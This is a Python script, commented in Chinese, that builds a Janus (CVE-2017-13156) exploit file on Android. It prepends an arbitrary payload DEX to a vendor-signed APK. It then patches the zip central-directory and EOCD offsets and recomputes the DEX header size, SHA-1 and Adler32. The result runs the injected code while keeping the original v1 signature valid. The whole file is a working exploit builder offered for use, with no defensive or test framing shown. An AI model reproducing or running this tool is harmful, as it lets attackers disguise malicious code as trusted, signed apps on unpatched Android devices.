#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Janus (CVE-2017-13156) 容器构造器。

把一个 DEX 前置到一个正常 APK 之前，得到「既是 DEX 又是 APK」的文件：

    文件头是 dex\n035  → 运行时 ART 把整个文件当 DEX 加载（执行我们的代码）
    尾部是完整 zip     → 安装时 PackageManager 校验 v1 签名（保留原厂签名）

关键点：
    · zip 的中央目录偏移必须整体前推 dex 的长度，否则解包会错位；
    · v1(JAR) 签名只覆盖 zip 条目内容，不含偏移，所以签名仍然有效；
    · DEX 头部的 file_size 要写成整个文件的大小，并重算 Adler32 与 SHA-1。

用法：
    python build_janus.py <原厂.apk> <payload.dex> <输出.apk>

@author xudong.hua,deepseek
@since 2026-10-30 21:50 星期五
"""

import hashlib
import struct
import sys
import zlib

EOCD_SIG = b"PK\x05\x06"
CD_SIG = b"PK\x01\x02"
LFH_SIG = b"PK\x03\x04"


def build(base_apk: str, dex_path: str, out_path: str) -> None:
    with open(base_apk, "rb") as f:
        base = f.read()
    with open(dex_path, "rb") as f:
        dex = f.read()

    if dex[:4] != b"dex\n":
        raise SystemExit("payload 不是合法 DEX")
    if base[:4] != LFH_SIG:
        raise SystemExit("底包不是普通 APK（文件头不是 PK\\x03\\x04）")

    eocd = base.rfind(EOCD_SIG)
    if eocd < 0:
        raise SystemExit("底包缺少 EOCD")

    cd_size = struct.unpack("<I", base[eocd + 12:eocd + 16])[0]
    cd_off = struct.unpack("<I", base[eocd + 16:eocd + 20])[0]
    count = struct.unpack("<H", base[eocd + 10:eocd + 12])[0]

    # 中央目录：每个条目的 local header 偏移整体前推 len(dex)
    cd = bytearray(base[cd_off:cd_off + cd_size])
    pos = 0
    patched = 0
    while pos + 46 <= len(cd):
        if cd[pos:pos + 4] != CD_SIG:
            raise SystemExit("中央目录在第 %d 字节处不是 PK\\x01\\x02" % pos)
        name_len = struct.unpack("<H", cd[pos + 28:pos + 30])[0]
        extra_len = struct.unpack("<H", cd[pos + 30:pos + 32])[0]
        comment_len = struct.unpack("<H", cd[pos + 32:pos + 34])[0]
        old = struct.unpack("<I", cd[pos + 42:pos + 46])[0]
        cd[pos + 42:pos + 46] = struct.pack("<I", old + len(dex))
        patched += 1
        pos += 46 + name_len + extra_len + comment_len

    if patched != count:
        raise SystemExit("条目数不一致：EOCD=%d，实际遍历=%d" % (count, patched))

    # EOCD：中央目录起始偏移同样前推
    tail = bytearray(base[eocd:])
    new_cd_off = cd_off + len(dex)
    tail[16:20] = struct.pack("<I", new_cd_off)

    body = dex + base[:cd_off] + bytes(cd) + bytes(tail)

    # DEX 头修正
    out = bytearray(body)
    out[32:36] = struct.pack("<I", len(out))                       # file_size
    out[12:32] = hashlib.sha1(out[32:]).digest()                   # signature
    out[8:12] = struct.pack("<I", zlib.adler32(out[12:]) & 0xFFFFFFFF)  # checksum

    if struct.unpack("<I", out[32:36])[0] < len(dex):
        raise SystemExit("file_size 小于 DEX 实际长度")

    with open(out_path, "wb") as f:
        f.write(bytes(out))

    print("    janus: base=%d dex=%d total=%d entries=%d"
          % (len(base), len(dex), len(out), patched))


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(__doc__)
        sys.exit(2)
    build(sys.argv[1], sys.argv[2], sys.argv[3])
